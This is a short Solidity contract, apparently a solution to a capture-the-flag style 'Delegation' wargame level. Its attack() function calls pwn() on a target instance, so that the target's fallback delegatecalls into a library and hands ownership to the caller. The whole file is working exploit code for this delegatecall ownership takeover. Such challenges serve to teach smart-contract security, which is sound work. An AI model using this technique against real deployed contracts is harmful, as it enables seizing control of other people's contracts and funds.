pragma solidity ^0.8.0;

contract AttackerDelegation {
    address immutable instance;

    constructor(address _instance) {
        instance = _instance;
    }

    function attack() public {
        // Call pwn() on the target instance which triggers fallback in Delegation
        (bool success,) = instance.call(abi.encodeWithSignature("pwn()"));
        require(success, "Call to Delegation failed");
    }
}